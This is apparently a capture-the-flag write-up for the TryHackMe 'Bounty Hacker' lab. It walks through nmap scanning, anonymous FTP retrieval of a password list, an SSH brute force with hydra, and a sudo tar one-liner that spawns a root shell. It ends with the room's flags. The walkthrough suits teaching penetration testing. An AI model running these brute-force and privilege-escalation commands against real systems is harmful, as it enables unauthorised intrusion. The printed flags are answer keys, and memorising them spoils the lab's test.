# Bounty Hacker

```sh
export IP=machine_ip
```

## Enumeration: nmap

```sh
nmap -A -sC -sV $IP
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-08-29 17:51 WEST
Nmap scan report for $IP
Host is up (0.079s latency).
Not shown: 967 filtered ports, 30 closed ports

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.106.45
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.61 seconds
```

## Initial access: FTP

```sh
ftp $IP
Connected to $IP.
220 (vsFTPd 3.0.3)
Name ($IP:z0d1ac): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get locks.txt
ftp> get task.txt
```

<details>
  <summary><i>locks.txt</i></summary>

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

</details>

<details>
  <summary><i>task.txt</i></summary>

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

</details>

## Brute force: hydra

We assume that the username is **lin**, we could also perform a ssh username enumeration to retreive this info.

```sh
hydra $IP -l lin -P ~/Downloads/locks.txt -t 4 ssh
```

```
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-29 18:07:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://$IP:22/
[22][ssh] host: $IP   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

## Login via ssh

```sh
ssh lin@$IP
```

<details>
  <summary><i>user.txt</i></summary>

```
$ cat ~/user.txt
THM{CR1M3_SyNd1C4T3}
```

</details>

## Privilege escalation

[GTFObins tar](https://gtfobins.github.io/gtfobins/tar/#sudo)

```sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

<details>
  <summary><i>root.txt</i></summary>

```
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

</details>
